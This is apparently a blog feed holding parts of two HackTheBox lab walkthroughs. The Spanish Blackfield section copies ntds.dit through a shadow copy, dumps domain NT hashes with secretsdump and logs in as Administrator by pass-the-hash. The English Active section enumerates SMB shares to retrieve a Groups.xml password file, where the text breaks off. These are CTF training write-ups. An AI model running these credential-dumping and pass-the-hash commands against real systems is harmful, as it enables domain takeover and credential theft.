Alias miguelito <span class="k">for </span>shadow ID <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span> <span class="nb">set </span>as environment variable.
Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span> <span class="nb">set </span>as environment variable.

Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span>

	<span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span>	%miguelito%
		- Shadow copy <span class="nb">set</span>: <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span>	%VSS_SHADOW_SET%
		- Original count of shadow copies <span class="o">=</span> 1
		- Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>6cd5140b-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
		- Creation <span class="nb">time</span>: 4/20/2024 7:06:01 PM
		- Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %miguelito% z:
-&gt; %miguelito% <span class="o">=</span> <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span>
The shadow copy was successfully exposed as z:<span class="se">\.</span>
-&gt;
</code></pre></div></div>

<ul>
  <li>Ahora vamos a la unidad donde nos la creo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir </span>z:<span class="se">\</span>


    Directory: z:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-----        4/20/2024   7:04 PM                Temp
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
<span class="nt">-a----</span>        2/28/2020   4:36 PM            447 notes.txt
</code></pre></div></div>

<ul>
  <li>Y gracias a esto ya podemos crear la copia del <code class="language-plaintext highlighter-rouge">ntds</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir </span>z:<span class="se">\W</span>indows<span class="se">\N</span>TDS


    Directory: z:<span class="se">\W</span>indows<span class="se">\N</span>TDS


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/10/2023   6:29 PM           8192 edb.chk
<span class="nt">-a----</span>        4/20/2024   6:58 PM       10485760 edb.log
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00004.log
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00005.log
<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00001.jrs
<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00002.jrs
<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edbtmp.log
<span class="nt">-a----</span>        4/20/2024   5:43 PM       18874368 ntds.dit
<span class="nt">-a----</span>        4/20/2024   5:58 PM          16384 ntds.jfm
<span class="nt">-a----</span>        4/20/2024   5:43 PM         434176 temp.edb
</code></pre></div></div>

<ul>
  <li>
    <p>Básicamente lo que hicimos fue un <code class="language-plaintext highlighter-rouge">shadow cop</code>y de lo que hay en <code class="language-plaintext highlighter-rouge">C:\</code> pero en <code class="language-plaintext highlighter-rouge">Z</code>.</p>
  </li>
  <li>
    <p>Pero con <code class="language-plaintext highlighter-rouge">copy</code> no se puede.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; copy z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.dit
Access to the path <span class="s1">'z:\Windows\NTDS\ntds.dit'</span> is denied.
At line:1 char:1
+ copy z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.dit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: <span class="o">(</span>z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit:FileInfo<span class="o">)</span> <span class="o">[</span>Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
</code></pre></div></div>

<ul>
  <li>Vamos a probar <code class="language-plaintext highlighter-rouge">robocopy</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; robocopy /b z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\ </span><span class="nb">.</span> ntds.dit

<span class="nt">-------------------------------------------------------------------------------</span>
   ROBOCOPY     ::     Robust File Copy <span class="k">for </span>Windows
<span class="nt">-------------------------------------------------------------------------------</span>

  Started : Saturday, April 20, 2024 7:12:11 PM
   Source : z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\</span>
     Dest : C:<span class="se">\T</span>emp<span class="se">\</span>

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

<span class="nt">------------------------------------------------------------------------------</span>

	                   1	z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\</span>
	    New File  		  18.0 m	ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  1.3%
  1.7%
  2.0%
  2.4%
  2.7%
  3.1%
  3.4%
  3.8%
  4.1%
  4.5%
  4.8%
  5.2%
  5.5%
  5.9%
  6.2%
  6.5%
  6.9%
  7.2%
  7.6%
  7.9%
  8.3%
  8.6%
  9.0%
  9.3%
  9.7%
 10.0%
 10.4%
 10.7%
 11.1%
 11.4%
 11.8%
 12.1%
 12.5%
 12.8%
 13.1%
 13.5%
 13.8%
 14.2%
 14.5%
 14.9%
 15.2%
 15.6%
 15.9%
 16.3%
 16.6%
 17.0%
 17.3%
 17.7%
 18.0%
 18.4%
 18.7%
 19.0%
 19.4%
 19.7%
 20.1%
 20.4%
 20.8%
 21.1%
 21.5%
 21.8%
 22.2%
 22.5%
 22.9%
 23.2%
 23.6%
 23.9%
 24.3%
 24.6%
 25.0%
 25.3%
 25.6%
 26.0%
 26.3%
 26.7%
 27.0%
 27.4%
 27.7%
 28.1%
 28.4%
 28.8%
 29.1%
 29.5%
 29.8%
 30.2%
 30.5%
 30.9%
 31.2%
 31.5%
 31.9%
 32.2%
 32.6%
 32.9%
 33.3%
 33.6%
 34.0%
 34.3%
 34.7%
 35.0%
 35.4%
 35.7%
 36.1%
 36.4%
 36.8%
 37.1%
 37.5%
 37.8%
 38.1%
 38.5%
 38.8%
 39.2%
 39.5%
 39.9%
 40.2%
 40.6%
 40.9%
 41.3%
 41.6%
 42.0%
 42.3%
 42.7%
 43.0%
 43.4%
 43.7%
 44.0%
 44.4%
 44.7%
 45.1%
 45.4%
 45.8%
 46.1%
 46.5%
 46.8%
 47.2%
 47.5%
 47.9%
 48.2%
 48.6%
 48.9%
 49.3%
 49.6%
 50.0%
 50.3%
 50.6%
 51.0%
 51.3%
 51.7%
 52.0%
 52.4%
 52.7%
 53.1%
 53.4%
 53.8%
 54.1%
 54.5%
 54.8%
 55.2%
 55.5%
 55.9%
 56.2%
 56.5%
 56.9%
 57.2%
 57.6%
 57.9%
 58.3%
 58.6%
 59.0%
 59.3%
 59.7%
 60.0%
 60.4%
 60.7%
 61.1%
 61.4%
 61.8%
 62.1%
 62.5%
 62.8%
 63.1%
 63.5%
 63.8%
 64.2%
 64.5%
 64.9%
 65.2%
 65.6%
 65.9%
 66.3%
 66.6%
 67.0%
 67.3%
 67.7%
 68.0%
 68.4%
 68.7%
 69.0%
 69.4%
 69.7%
 70.1%
 70.4%
 70.8%
 71.1%
 71.5%
 71.8%
 72.2%
 72.5%
 72.9%
 73.2%
 73.6%
 73.9%
 74.3%
 74.6%
 75.0%
 75.3%
 75.6%
 76.0%
 76.3%
 76.7%
 77.0%
 77.4%
 77.7%
 78.1%
 78.4%
 78.8%
 79.1%
 79.5%
 79.8%
 80.2%
 80.5%
 80.9%
 81.2%
 81.5%
 81.9%
 82.2%
 82.6%
 82.9%
 83.3%
 83.6%
 84.0%
 84.3%
 84.7%
 85.0%
 85.4%
 85.7%
 86.1%
 86.4%
 86.8%
 87.1%
 87.5%
 87.8%
 88.1%
 88.5%
 88.8%
 89.2%
 89.5%
 89.9%
 90.2%
 90.6%
 90.9%
 91.3%
 91.6%
 92.0%
 92.3%
 92.7%
 93.0%
 93.4%
 93.7%
 94.0%
 94.4%
 94.7%
 95.1%
 95.4%
 95.8%
 96.1%
 96.5%
 96.8%
 97.2%
 97.5%
 97.9%
 98.2%
 98.6%
 98.9%
 99.3%
 99.6%
100%
100%

<span class="nt">------------------------------------------------------------------------------</span>

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           171585163 Bytes/sec.
   Speed :            9818.181 MegaBytes/min.
   Ended : Saturday, April 20, 2024 7:12:11 PM

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/20/2024   7:06 PM            615 2024-04-20_19-06-01_DC01.cab
<span class="nt">-a----</span>        4/20/2024   5:43 PM       18874368 ntds.dit
<span class="nt">-a----</span>        4/20/2024   6:42 PM       17375232 system
<span class="nt">-a----</span>        4/20/2024   7:04 PM             96 zi.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora ya lo podemos descargar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; download C:<span class="se">\T</span>emp<span class="se">\n</span>tds.dit
</code></pre></div></div>

<ul>
  <li>Una vez nos descargamos el <code class="language-plaintext highlighter-rouge">ntds.dit</code> y el system ya podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> para ver los hashes del usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> system <span class="nt">-ntds</span> ntds.dit LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ahora ya podemos validar el hash y conectarnos para leer la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\A</span>dministrator:184fb5e5178480be64824d4cd53b99ee <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
4375a629c7c67c8e29db269060c955cb
</code></pre></div></div>

<ul>
  <li>Vemos que dejaron una nota.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords <span class="nt">--</span> Done.
- change krbtgt password twice <span class="nt">--</span> Done.
- disable auditor<span class="s1">'s account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup &amp; restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Active (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html" rel="alternate" type="text/html" title="HackTheBox - Active (easy)" /><published>2024-04-15T00:00:00-06:00</published><updated>2024-04-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/15/active</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/5837ac5e28291146a9f2a8a015540c28.png" />
</p>

<ul>
  <li>Active is a quick and fun medium box where we have to do SMB enumeration to obtain credentials of a valid user in the dc and Kerberoasting to receive a ticket to crack this ticket is for the administrator user.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,445,593,3269,47001,49153,49168 10.10.10.100 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-28 17:22 CST
Nmap scan report <span class="k">for </span>10.10.10.100
Host is up <span class="o">(</span>0.66s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-01-28 23:22:21Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  tcpwrapped
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49153/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2023-01-28T23:23:22
|_  start_date: 2023-01-28T23:13:30
|_clock-skew: <span class="nt">-1s</span>
</code></pre></div></div>

<h2 id="enumeration">Enumeration</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>We see a domain add to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 active.htb
PING active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>902 ms

<span class="nt">---</span> active.htb ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 901.525/901.525/901.525/0.000 ms
❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.10.10.100 active.htb
</code></pre></div></div>

<ul>
  <li>There are shared resources.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.100 <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>We can read <code class="language-plaintext highlighter-rouge">Replication</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	

</code></pre></div></div>

<ul>
  <li>We found this.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplication<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Replication                                       	READ ONLY	
	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
</code></pre></div></div>

<ul>
  <li>Now download <code class="language-plaintext highlighter-rouge">Groups.xml</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">--download</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
<span class="o">[</span>+] Starting download: Replication<span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml <span class="o">(</span>533 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/nmap/10.10.10.100-Replication_active.htb_Policies_<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>_MACHINE_Preferences_Groups_Groups.xml
</code></pre></div></div>

<ul>
  <li>It’s a password.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/bin/cat groups.xml
